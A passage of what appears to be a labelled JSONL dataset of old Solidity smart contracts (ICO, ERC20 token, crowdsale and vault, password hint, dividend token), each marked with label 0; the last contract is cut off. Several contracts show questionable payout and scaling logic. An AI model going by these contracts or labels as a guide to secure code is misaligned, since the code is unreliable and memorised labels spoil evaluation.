newOwner);\r\r\n\t\tallowed[this][oldOwner] = 0;\r\r\n\t\tallowed[this][newOwner] = tokenBalanceOf[this];\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Transfer ether from smartcontract to owner\r\r\n\tfunction collect() isOwner {\r\r\n        require(this.balance > 0);\r\r\n\t\trequire(minimalGoalReached);\t\/\/ Owner can get funds only if minimal fundrising is reached\r\r\n\t\twithdraw(this.balance);\r\r\n    }\r\r\n\r\r\n\t\/\/\/ @notice Withdraw an amount of ether\r\r\n\t\/\/\/ @param summeInWei - amout to withdraw\r\r\n\tfunction withdraw(uint256 summeInWei) isOwner {\r\r\n\t\tuint256 contractbalance = this.balance;\r\r\n\t\taddress sender = msg.sender;\r\r\n\t\trequire(contractbalance >= summeInWei);\r\r\n\t\trequire(minimalGoalReached);\t\/\/ Owner can get funds only if minimal fundrising is reached\r\r\n\t\twithdrawed(sender, summeInWei, \"wei withdrawed\");\r\r\n        sender.transfer(summeInWei);\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Deposit an amount of ether\r\r\n\tfunction deposit() payable isOwner {\r\r\n\t\trequire(msg.value > 0);\r\r\n\t\trequire(msg.sender.balance >= msg.value);\r\r\n\t\tdeposited(msg.sender, msg.value, \"wei deposited\");\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Allow user to exit ICO\r\r\n\t\/\/\/ @param exitAllowed - status if the exit is allowed\r\r\n\tfunction allowIcoExit(bool exitAllowed) isOwner {\r\r\n\t\trequire(icoExitIsPossible != exitAllowed);\r\r\n\t\ticoExitIsPossible = exitAllowed;\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Stop running ICO\r\r\n\t\/\/\/ @param icoIsStopped - status if this ICO is stopped\r\r\n\tfunction stopThisIco(bool icoIsStopped) isOwner {\r\r\n\t\trequire(icoIsClosed != icoIsStopped);\r\r\n\t\ticoIsClosed = icoIsStopped;\r\r\n\t\tif(icoIsStopped) {\r\r\n\t\t\ticoStatusUpdated(msg.sender, \"Coin offering was stopped!\");\r\r\n\t\t}else {\r\r\n\t\t\ticoStatusUpdated(msg.sender, \"Coin offering is running!\");\r\r\n\t\t}\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Sell all tokens for half of a price and exit this ICO\r\r\n\tfunction exitThisIcoForHalfOfTokenPrice() {\r\r\n\t\trequire(icoExitIsPossible);\r\r\n\t\trequire(!frozenAccount[msg.sender]);\r\r\n\t\trequire(tokenBalanceOf[msg.sender] > 0);         \t\/\/ checks if the sender has enough to sell\r\r\n\t\trequire(currentTokenPrice > 1);\r\r\n\t\tuint256 amount = tokenBalanceOf[msg.sender] ;\r\r\n\t\tuint256 revenue = amount * currentTokenPrice \/ 2;\r\r\n\t\trequire(this.balance >= revenue);\r\r\n\t\t_transfer(msg.sender, this, amount);\r\r\n\t\tmsg.sender.transfer(revenue);                \t\/\/ sends ether to the seller: it&#39;s important to do this last to prevent recursion attacks\r\r\n\t}\r\r\n\r\r\n\t\/\/\/ @notice Sell all of tokens for all ether of this smartcontract\r\r\n\tfunction getAllMyTokensForAllEtherOnContract() {\r\r\n\t\trequire(icoExitIsPossible);\r\r\n\t\trequire(!frozenAccount[msg.sender]);\r\r\n\t\trequire(tokenBalanceOf[msg.sender] > 0);         \t\/\/ checks if the sender has enough to sell\r\r\n\t\trequire(currentTokenPrice > 1);\r\r\n\t\tuint256 amount = tokenBalanceOf[msg.sender] ;\r\r\n\t\tuint256 revenue = amount * currentTokenPrice \/ 2;\r\r\n\t\trequire(this.balance <= revenue);\r\r\n\t\t_transfer(msg.sender, this, amount);\r\r\n\t\tmsg.sender.transfer(this.balance); \r\r\n\t}\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.18;\r\r\n\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\n\/\/ &#39;CryptoDime&#39; token contract\r\r\n\/\/\r\r\n\/\/ Deployed to : 0xCd603343D5bdF2e95A0d9b92F8949177AB54E20B\r\r\n\/\/ Symbol      : FXD\r\r\n\/\/ Name        : CryptoDime\r\r\n\/\/ Total supply: 10000000000\r\r\n\/\/ Decimals    : 0\r\r\n\/\/\r\r\n\/\/ Enjoy.\r\r\n\/\/\r\r\n\/\/ (c) by CryptoDime. All rights reserved.\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\n\r\r\n\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\n\/\/ Safe maths\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\ncontract SafeMath {\r\r\n    function safeAdd(uint a, uint b) public pure returns (uint c) {\r\r\n        c = a + b;\r\r\n        require(c >= a);\r\r\n    }\r\r\n    function safeSub(uint a, uint b) public pure returns (uint c) {\r\r\n        require(b <= a);\r\r\n        c = a - b;\r\r\n    }\r\r\n    function safeMul(uint a, uint b) public pure returns (uint c) {\r\r\n        c = a * b;\r\r\n        require(a == 0 || c \/ a == b);\r\r\n    }\r\r\n    function safeDiv(uint a, uint b) public pure returns (uint c) {\r\r\n        require(b > 0);\r\r\n        c = a \/ b;\r\r\n    }\r\r\n}\r\r\n\r\r\n\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\n\/\/ ERC Token Standard Interface\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\ncontract ERC20Interface {\r\r\n    function totalSupply() public constant returns (uint);\r\r\n    function balanceOf(address tokenOwner) public constant returns (uint balance);\r\r\n    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);\r\r\n    function transfer(address to, uint tokens) public returns (bool success);\r\r\n    function approve(address spender, uint tokens) public returns (bool success);\r\r\n    function transferFrom(address from, address to, uint tokens) public returns (bool success);\r\r\n\r\r\n    event Transfer(address indexed from, address indexed to, uint tokens);\r\r\n    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\r\r\n}\r\r\n\r\r\n\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\n\/\/ Contract function to receive approval and execute function in one call\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\ncontract ApproveAndCallFallBack {\r\r\n    function receiveApproval(address from, uint256 tokens, address token, bytes data) public;\r\r\n}\r\r\n\r\r\n\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\n\/\/ Owned contract\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\ncontract Owned {\r\r\n    address public owner;\r\r\n    address public newOwner;\r\r\n\r\r\n    event OwnershipTransferred(address indexed _from, address indexed _to);\r\r\n\r\r\n    function Owned() public {\r\r\n        owner = msg.sender;\r\r\n    }\r\r\n\r\r\n    modifier onlyOwner {\r\r\n        require(msg.sender == owner);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    function transferOwnership(address _newOwner) public onlyOwner {\r\r\n        newOwner = _newOwner;\r\r\n    }\r\r\n    function acceptOwnership() public {\r\r\n        require(msg.sender == newOwner);\r\r\n        OwnershipTransferred(owner, newOwner);\r\r\n        owner = newOwner;\r\r\n        newOwner = address(0);\r\r\n    }\r\r\n}\r\r\n\r\r\n\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\n\/\/ ERC20 Token, with the addition of symbol, name and decimals and assisted\r\r\n\/\/ token transfers\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\ncontract CryptoDime is ERC20Interface, Owned, SafeMath {\r\r\n    string public symbol;\r\r\n    string public  name;\r\r\n    uint8 public decimals;\r\r\n    uint public _totalSupply;\r\r\n\r\r\n    mapping(address => uint) balances;\r\r\n    mapping(address => mapping(address => uint)) allowed;\r\r\n\r\r\n\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    \/\/ Constructor\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    function CryptoDime() public {\r\r\n        symbol = \"CDM\";\r\r\n        name = \"CryptoDime\";\r\r\n        decimals = 0;\r\r\n        _totalSupply = 10000000000;\r\r\n        balances[0xCd603343D5bdF2e95A0d9b92F8949177AB54E20B] = _totalSupply;\r\r\n        Transfer(address(0), 0xCd603343D5bdF2e95A0d9b92F8949177AB54E20B, _totalSupply);\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    \/\/ Total supply\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    function totalSupply() public constant returns (uint) {\r\r\n        return _totalSupply  - balances[address(0)];\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    \/\/ Get the token balance for account tokenOwner\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    function balanceOf(address tokenOwner) public constant returns (uint balance) {\r\r\n        return balances[tokenOwner];\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    \/\/ Transfer the balance from token owner&#39;s account to to account\r\r\n    \/\/ - Owner&#39;s account must have sufficient balance to transfer\r\r\n    \/\/ - 0 value transfers are allowed\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    function transfer(address to, uint tokens) public returns (bool success) {\r\r\n        balances[msg.sender] = safeSub(balances[msg.sender], tokens);\r\r\n        balances[to] = safeAdd(balances[to], tokens);\r\r\n        Transfer(msg.sender, to, tokens);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    \/\/ Token owner can approve for spender to transferFrom(...) tokens\r\r\n    \/\/ from the token owner&#39;s account\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    function approve(address spender, uint tokens) public returns (bool success) {\r\r\n        allowed[msg.sender][spender] = tokens;\r\r\n        Approval(msg.sender, spender, tokens);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    \/\/ Transfer tokens from the from account to the to account\r\r\n    \/\/ \r\r\n    \/\/ The calling account must already have sufficient tokens approve(...)-d\r\r\n    \/\/ for spending from the from account and\r\r\n    \/\/ - From account must have sufficient balance to transfer\r\r\n    \/\/ - Spender must have sufficient allowance to transfer\r\r\n    \/\/ - 0 value transfers are allowed\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    function transferFrom(address from, address to, uint tokens) public returns (bool success) {\r\r\n        balances[from] = safeSub(balances[from], tokens);\r\r\n        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\r\r\n        balances[to] = safeAdd(balances[to], tokens);\r\r\n        Transfer(from, to, tokens);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    \/\/ Returns the amount of tokens approved by the owner that can be\r\r\n    \/\/ transferred to the spender&#39;s account\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {\r\r\n        return allowed[tokenOwner][spender];\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    \/\/ Token owner can approve for spender to transferFrom(...) tokens\r\r\n    \/\/ from the token owner&#39;s account. The spender contract function\r\r\n    \/\/ receiveApproval(...) is then executed\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    function approveAndCall(address spender, uint tokens, bytes data) public returns (bool success) {\r\r\n        allowed[msg.sender][spender] = tokens;\r\r\n        Approval(msg.sender, spender, tokens);\r\r\n        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, this, data);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    \/\/ Don&#39;t accept ETH\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    function () public payable {\r\r\n        revert();\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    \/\/ Owner can transfer out any accidentally sent ERC20 tokens\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {\r\r\n        return ERC20Interface(tokenAddress).transfer(owner, tokens);\r\r\n    }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.18;\r\r\n\r\r\n\r\r\nlibrary SafeMath {\r\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n        if (a == 0) {\r\r\n            return 0;\r\r\n        }\r\r\n        uint256 c = a * b;\r\r\n        assert(c \/ a == b);\r\r\n        return c;\r\r\n    }\r\r\n\r\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n\r\r\n        uint256 c = a \/ b;\r\r\n\r\r\n        return c;\r\r\n    }\r\r\n\r\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n        assert(b <= a);\r\r\n        return a - b;\r\r\n    }\r\r\n\r\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n        uint256 c = a + b;\r\r\n        assert(c >= a);\r\r\n        return c;\r\r\n    }\r\r\n}\r\r\n\r\r\ncontract Ownable {\r\r\n    address public owner;\r\r\n\r\r\n\r\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\r\n\r\r\n\r\r\n    function Ownable() public {\r\r\n        owner = msg.sender;\r\r\n    }\r\r\n\r\r\n    modifier onlyOwner() {\r\r\n        require(msg.sender == owner);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n\r\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\r\n        require(newOwner != address(0));\r\r\n        OwnershipTransferred(owner, newOwner);\r\r\n        owner = newOwner;\r\r\n    }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\ncontract BurnableToken {\r\r\n    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool);\r\r\n\r\r\n    function allowance(address _owner, address _spender) public view returns (uint256);\r\r\n\r\r\n    function approve(address _spender, uint256 _value) public returns (bool);\r\r\n\r\r\n    function balanceOf(address _owner) public view returns (uint256 balance);\r\r\n\r\r\n    function burn(uint256 _value) public;\r\r\n\r\r\n    ArnaCrowdsale public  crowdsale;\r\r\n\r\r\n    function increaseApproval(address _spender, uint _addedValue) public returns (bool);\r\r\n\r\r\n    address public owner;\r\r\n\r\r\n    function setCrowdsale(ArnaCrowdsale _crowdsale) public ;\r\r\n\r\r\n    function setTransferable(bool _transferable) public ;\r\r\n\r\r\n    uint256 public totalSupply;\r\r\n\r\r\n    function transfer(address _to, uint256 _value) public returns (bool);\r\r\n\r\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool);\r\r\n\r\r\n    function transferOwnership(address newOwner) public;\r\r\n\r\r\n    bool public transferable;\r\r\n}\r\r\n\r\r\n\r\r\ncontract ArnaToken is BurnableToken {\r\r\n    string public constant name = \"ArnaToken\";\r\r\n    string public constant symbol = \"ARNA\";\r\r\n    uint8 public constant decimals = 18;\r\r\n    uint256 public constant INITIAL_SUPPLY = 1000000000 * (10 ** uint256(decimals));\r\r\n\r\r\n}\r\r\n\r\r\n\/\/========================================\r\r\n\r\r\n\r\r\n\r\r\ncontract ArnaVault is Ownable {\r\r\n    using SafeMath for uint256;\r\r\n    ArnaToken token;\r\r\n\r\r\n    uint256 amount;\r\r\n\r\r\n    uint256 public withdrawn = 0;\r\r\n\r\r\n    uint startTime;\r\r\n\r\r\n    uint period;\r\r\n\r\r\n    uint256 percent;\r\r\n\r\r\n    address beneficiary;\r\r\n\r\r\n    function ArnaVault(ArnaToken _token, uint _period, uint256 _percent, address _beneficiary) public {\r\r\n        token = _token;\r\r\n        period = _period;\r\r\n        percent = _percent;\r\r\n        \/\/ 2500 -> 2.5%\r\r\n        beneficiary = _beneficiary;\r\r\n    }\r\r\n\r\r\n    function tokensInVault() public constant returns (uint256){\r\r\n        return token.balanceOf(this);\r\r\n    }\r\r\n\r\r\n    function start() public onlyOwner {\r\r\n        assert(token.balanceOf(this) > 0);\r\r\n        amount = token.balanceOf(this);\r\r\n        startTime = block.timestamp;\r\r\n    }\r\r\n\r\r\n    function tokensAvailable() public constant returns (uint256){\r\r\n        return (((block.timestamp - startTime) \/ period + 1)\r\r\n        * amount * percent \/ 100000)\r\r\n        .sub(withdrawn);\r\r\n    }\r\r\n\r\r\n    function withdraw() public {\r\r\n        assert(msg.sender == beneficiary || msg.sender == owner);\r\r\n        assert(tokensAvailable() > 0);\r\r\n        token.transfer(beneficiary, tokensAvailable());\r\r\n        withdrawn = withdrawn.add(tokensAvailable());\r\r\n    }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/\/========================================\r\r\n\r\r\ncontract ArnaCrowdsale is Ownable {\r\r\n    using SafeMath for uint256;\r\r\n    ArnaControl arnaControl;\r\r\n\r\r\n    ArnaToken public token;\r\r\n\r\r\n    uint256 public totalRise;\r\r\n\r\r\n\r\r\n    function ArnaCrowdsale(ArnaControl _arnaControl, ArnaToken _token) public {\r\r\n        arnaControl = _arnaControl;\r\r\n        token = _token;\r\r\n    }\r\r\n\r\r\n    function tokensToSale() public view returns (uint256){\r\r\n        return token.balanceOf(this);\r\r\n    }\r\r\n\r\r\n    function burnUnsold() public onlyOwner returns (uint256){\r\r\n        uint256 unsold = token.balanceOf(this);\r\r\n        token.burn(unsold);\r\r\n        return unsold;\r\r\n    }\r\r\n\r\r\n    function price() public constant returns (uint256) {\r\r\n        return arnaControl.getPrice();\r\r\n    }\r\r\n\r\r\n    function priceWithBonus() public constant returns (uint256) {\r\r\n        return arnaControl.getPriceWithBonus();\r\r\n    }\r\r\n\r\r\n    function() public payable {\r\r\n        uint256 amount = msg.value.mul(1 ether).div(priceWithBonus());\r\r\n        assert(token.balanceOf(this) > amount);\r\r\n        token.transfer(msg.sender, amount);\r\r\n        totalRise = totalRise.add(msg.value);\r\r\n    }\r\r\n\r\r\n    function sendTokens(address beneficiary, uint256 amount) public onlyOwner {\r\r\n        assert(token.balanceOf(this) > amount);\r\r\n        token.transfer(beneficiary, amount);\r\r\n        totalRise = totalRise.add(amount.mul(priceWithBonus()).div(1 ether));\r\r\n    }\r\r\n\r\r\n    function withdraw() public onlyOwner returns (bool) {\r\r\n        assert(totalRise >= arnaControl.getSoftCap());\r\r\n        return arnaControl.send(this.balance);\r\r\n    }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/\/========================================\r\r\n\r\r\ncontract ArnaControl is Ownable {\r\r\n    using SafeMath for uint256;\r\r\n    ArnaToken public token;\r\r\n\r\r\n    ArnaCrowdsale public  crowdsale;\r\r\n\r\r\n    ArnaVault public founders;\r\r\n\r\r\n    ArnaVault public team;\r\r\n\r\r\n    \/\/    ArnaVault public partners;\r\r\n\r\r\n    bool public isStarted;\r\r\n\r\r\n    bool public isStoped;\r\r\n\r\r\n    uint256 constant TO_SALE = 500000000 * (10 ** 18);\r\r\n\r\r\n    uint256  price = 0.000266 ether;\r\r\n\r\r\n    uint256  priceWithBonus = 0.000266 ether; \/\/  15% => 0.000231304 ether;\r\r\n\r\r\n    uint256 softCap = 3333 ether;\r\r\n\r\r\n    address public coldWallet;\r\r\n\r\r\n    function ArnaControl(ArnaToken _arnaToken) public {\r\r\n        token = _arnaToken;\r\r\n        coldWallet = msg.sender;\r\r\n    }\r\r\n\r\r\n    function SaleStop() public onlyOwner {\r\r\n        assert(isStarted);\r\r\n        assert(!isStoped);\r\r\n\r\r\n        setTransferable(true);\r\r\n\r\r\n        uint256 toBurn = crowdsale.burnUnsold();\r\r\n        token.burn(toBurn);\r\r\n\r\r\n        uint256 toFounders = thisContactsTokens().div(5);\r\r\n        \/\/ 100 \/ 500\r\r\n        uint256 toPartners = thisContactsTokens().div(2);\r\r\n        \/\/ 250 \/ 500\r\r\n        uint256 toTeam = thisContactsTokens().sub(toFounders).sub(toPartners);\r\r\n        \/\/ 150 \/ 500\r\r\n\r\r\n\r\r\n        founders = new ArnaVault(token, 360 days, 50000, address(0xC041CB562e4C398710dF38eAED539b943641f7b1));\r\r\n        token.transfer(founders, toFounders);\r\r\n        founders.start();\r\r\n\r\r\n        team = new ArnaVault(token, 180 days, 16667, address(0x2ABfE4e1809659ab60eB0053cC799b316afCc556));\r\r\n        token.transfer(team, toTeam);\r\r\n        team.start();\r\r\n\r\r\n        \/\/        partners = new ArnaVault(token, 0, 100000,  0xd6496BBd13ae8C4Bdeea68799F678a1456B62f23);\r\r\n        \/\/        token.transfer(partners, thisContactsTokens().div(2));\r\r\n        \/\/        partners.start();\r\r\n\r\r\n        token.transfer(address(0xd6496BBd13ae8C4Bdeea68799F678a1456B62f23), toPartners);\r\r\n\r\r\n\r\r\n        isStarted = false;\r\r\n        isStoped = true;\r\r\n    }\r\r\n\r\r\n    function SaleStart() public onlyOwner {\r\r\n        assert(!isStarted);\r\r\n        assert(!isStoped);\r\r\n        crowdsale = new ArnaCrowdsale(this, token);\r\r\n        token.setCrowdsale(crowdsale);\r\r\n        token.transfer(crowdsale, TO_SALE);\r\r\n        isStarted = true;\r\r\n    }\r\r\n\r\r\n    function thisContactsTokens() public constant returns (uint256){\r\r\n        return token.balanceOf(this);\r\r\n    }\r\r\n\r\r\n    function getPrice() public constant returns (uint256){\r\r\n        return price;\r\r\n    }\r\r\n\r\r\n    \/\/ _newPrice : 266 => 0.000266\r\r\n    function setPrice(uint256 _newPrice) public onlyOwner {\r\r\n        assert(_newPrice > 0);\r\r\n        price = _newPrice * (10 ** 12);\r\r\n    }\r\r\n\r\r\n    function getPriceWithBonus() public constant returns (uint256){\r\r\n        return priceWithBonus;\r\r\n    }\r\r\n\r\r\n    \/\/ _newPrice : 266 => 0.000266\r\r\n    function setPriceWithBonus(uint256 _newPrice) public onlyOwner {\r\r\n        assert(_newPrice > 0);\r\r\n        assert(_newPrice  * (10 ** 12) <= price);\r\r\n        priceWithBonus = _newPrice  * (10 ** 12);\r\r\n    }\r\r\n\r\r\n    function getSoftCap() public constant returns (uint256){\r\r\n        return softCap;\r\r\n    }\r\r\n\r\r\n    \/\/ _softCap : 3333000000 => 3333 ether;\r\r\n    function setSoftCap(uint256 _softCap) public onlyOwner {\r\r\n        softCap = _softCap  * (10 ** 12);\r\r\n    }\r\r\n\r\r\n\r\r\n    function() public payable {\r\r\n\r\r\n    }\r\r\n\r\r\n    function setColdWallet(address _coldWallet) public onlyOwner {\r\r\n        coldWallet = _coldWallet;\r\r\n    }\r\r\n\r\r\n    function withdraw() public onlyOwner returns (bool) {\r\r\n        crowdsale.withdraw();\r\r\n        return coldWallet.send(this.balance);\r\r\n    }\r\r\n\r\r\n    \/\/ amount : 12345000 => 12.345000 ARNA = 12345000000000000000;\r\r\n    function sendTokens(address beneficiary, uint256 amount) public onlyOwner {\r\r\n        crowdsale.sendTokens(beneficiary, amount * (10 ** 12));\r\r\n    }\r\r\n\r\r\n    function setTransferable(bool _transferable) public onlyOwner {\r\r\n        token.setTransferable(_transferable);\r\r\n    }\r\r\n}","label":0}
{"code":"pragma solidity 0.4.8;\r\r\n\r\r\ncontract MyPasswordHint {\r\r\n    string public hint;\r\r\n    address public owner;\r\r\n    \/* Constructor *\/\r\r\n    function MyPasswordHint() {\r\r\n        hint = \"\";\r\r\n        owner = msg.sender;\r\r\n    }\r\r\n    function setHint(string nHint) {\r\r\n        if (msg.sender == owner) {\r\r\n            hint = nHint;\r\r\n        }\r\r\n    }\r\r\n    function kill() {\r\r\n        if (msg.sender == owner) {\r\r\n            selfdestruct(owner);\r\r\n        }\r\r\n    }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.18;\r\r\n\r\r\n\r\r\ncontract TestTest {\r\r\n\r\r\n\t\/\/ scaleFactor is used to convert Ether into tokens and vice-versa: they're of different\r\r\n\t\/\/ orders of magnitude, hence the need to bridge between the two.\r\r\n\tuint256 constant scaleFactor = 0x10000000000000000;  \/\/ 2^64\r\r\n\r\r\n\t\/\/ CRR = 50%\r\r\n\t\/\/ CRR is Cash Reserve Ratio (in this case Crypto Reserve Ratio).\r\r\n\t\/\/ For more on this: check out https:\/\/en.wikipedia.org\/wiki\/Reserve_requirement\r\r\n\tint constant crr_n = 1; \/\/ CRR numerator\r\r\n\tint constant crr_d = 2; \/\/ CRR denominator\r\r\n\r\r\n\t\/\/ The price coefficient. Chosen such that at 1 token total supply\r\r\n\t\/\/ the amount in reserve is 0.5 ether and token price is 1 Ether.\r\r\n\tint constant price_coeff = -0x296ABF784A358468C;\r\r\n\r\r\n\t\/\/ Typical values that we have to declare.\r\r\n\tstring constant public name = \"TestTest\";\r\r\n\tstring constant public symbol = \"EPY\";\r\r\n\tuint8 constant public decimals = 18;\r\r\n\r\r\n\t\/\/ Array between each address and their number of tokens.\r\r\n\tmapping(address => uint256) public tokenBalance;\r\r\n\t\t\r\r\n\t\/\/ Array between each address and how much Ether has been paid out to it.\r\r\n\t\/\/ Note that this is scaled by the scaleFactor variable.\r\r\n\tmapping(address => int256) public payouts;\r\r\n\r\r\n\t\/\/ Variable tracking how many tokens are in existence overall.\r\r\n\tuint256 public totalSupply;\r\r\n\r\r\n\t\/\/ Aggregate sum of all payouts.\r\r\n\t\/\/ Note that this is scaled by the scaleFactor variable.\r\r\n\tint256 totalPayouts;\r\r\n\r\r\n\t\/\/ Variable tracking how much Ether each token is currently worth.\r\r\n\t\/\/ Note that this is scaled by the scaleFactor variable.\r\r\n\tuint256 earningsPerToken;\r\r\n\t\r\r\n\t\/\/ Current contract balance in Ether\r\r\n\tuint256 public contractBalance;\r\r\n\r\r\n\tfunction TestTest() public {}\r\r\n\r\r\n\t\/\/ The following functions are used by the front-end for display purposes.\r\r\n\r\r\n\t\/\/ Returns the number of tokens currently held by _owner.\r\r\n\tfunction balanceOf(address _owner) public constant returns (uint256 balance) {\r\r\n\t\treturn tokenBalance[_owner];\r\r\n\t}\r\r\n\r\r\n\t\/\/ Withdraws all dividends held by the caller sending the transaction, updates\r\r\n\t\/\/ the requisite global variables, and transfers Ether back to the caller.\r\r\n\tfunction withdraw() public {\r\r\n\t\t\/\/ Retrieve the dividends associated with the address the request came from.\r\r\n\t\tvar balance = dividends(msg.sender);\r\r\n\t\t\r\r\n\t\t\/\/ Update the payouts array, incrementing the request address by `balance`.\r\r\n\t\tpayouts[msg.sender] += (int256) (balance * scaleFactor);\r\r\n\t\t\r\r\n\t\t\/\/ Increase the total amount that's been paid out to maintain invariance.\r\r\n\t\ttotalPayouts += (int256) (balance * scaleFactor);\r\r\n\t\t\r\r\n\t\t\/\/ Send the dividends to the address that requested the withdraw.\r\r\n\t\tcontractBalance = sub(contractBalance, balance);\r\r\n\t\tmsg.sender.transfer(balance);\r\r\n\t}\r\r\n\r\r\n\t\/\/ Converts the Ether accrued as dividends back into EPY tokens without having to\r\r\n\t\/\/ withdraw it first. Saves on gas and potential price spike loss.\r\r\n\tfunction reinvestDividends() public {\r\r\n\t\t\/\/ Retrieve the dividends associated with the address the request came from.\r\r\n\t\tvar balance = dividends(msg.sender);\r\r\n\t\t\r\r\n\t\t\/\/ Update the payouts array, incrementing the request address by `balance`.\r\r\n\t\t\/\/ Since this is essentially a shortcut to withdrawing and reinvesting, this step still holds.\r\r\n\t\tpayouts[msg.sender] += (int256) (balance * scaleFactor);\r\r\n\t\t\r\r\n\t\t\/\/ Increase the total amount that's been paid out to maintain invariance.\r\r\n\t\ttotalPayouts += (int256) (balance * scaleFactor);\r\r\n\t\t\r\r\n\t\t\/\/ Assign balance to a new variable.\r\r\n\t\tuint value_ = (uint) (balance);\r\r\n\t\t\r\r\n\t\t\/\/ If your dividends are worth less than 1 szabo, or more than a million Ether\r\r\n\t\t\/\/ (in which case, why are you even here), abort.\r\r\n\t\tif (value_ < 0.000001 ether || value_ > 1000000 ether)\r\r\n\t\t\trevert();\r\r\n\t\t\t\r\r\n\t\t\/\/ msg.sender is the address of the caller.\r\r\n\t\tvar sender = msg.sender;\r\r\n\t\t\r\r\n\t\t\/\/ A temporary reserve variable used for calculating the reward the holder gets for buying tokens.\r\r\n\t\t\/\/ (Yes, the buyer receives a part of the distribution as well!)\r\r\n\t\tvar res = reserve() - balance;\r\r\n\r\r\n\t\t\/\/ 10% of the total Ether sent is used to pay existing holders.\r\r\n\t\tvar fee = div(value_, 15);\r\r\n\t\t\r\r\n\t\t\/\/ The amount of Ether used to purchase new tokens for the caller.\r\r\n\t\tvar numEther = value_ - fee;\r\r\n\t\t\r\r\n\t\t\/\/ The number of tokens which can be purchased for numEther.\r\r\n\t\tvar numTokens = calculateDividendTokens(numEther, balance);\r\r\n\t\t\r\r\n\t\t\/\/ The buyer fee, scaled by the scaleFactor variable.\r\r\n\t\tvar buyerFee = fee * scaleFactor;\r\r\n\t\t\r\r\n\t\t\/\/ Check that we have tokens in existence (this should always be true), or\r\r\n\t\t\/\/ else you're gonna have a bad time.\r\r\n\t\tif (totalSupply > 0) {\r\r\n\t\t\t\/\/ Compute the bonus co-efficient for all existing holders and the buyer.\r\r\n\t\t\t\/\/ The buyer receives part of the distribution for each token bought in the\r\r\n\t\t\t\/\/ same way they would have if they bought each token individually.\r\r\n\t\t\tvar bonusCoEff =\r\r\n\t\t\t    (scaleFactor - (res + numEther) * numTokens * scaleFactor \/ (totalSupply + numTokens) \/ numEther)\r\r\n\t\t\t    * (uint)(crr_d) \/ (uint)(crr_d-crr_n);\r\r\n\t\t\t\t\r\r\n\t\t\t\/\/ The total reward to be distributed amongst the masses is the fee (in Ether)\r\r\n\t\t\t\/\/ multiplied by the bonus co-efficient.\r\r\n\t\t\tvar holderReward = fee * bonusCoEff;\r\r\n\t\t\t\r\r\n\t\t\tbuyerFee -= holderReward;\r\r\n\r\r\n\t\t\t\/\/ Fee is distributed to all existing token holders before the new tokens are purchased.\r\r\n\t\t\t\/\/ rewardPerShare is the amount gained per token thanks to this buy-in.\r\r\n\t\t\tvar rewardPerShare = holderReward \/ totalSupply;\r\r\n\t\t\t\r\r\n\t\t\t\/\/ The Ether value per token is increased proportionally.\r\r\n\t\t\tearningsPerToken += 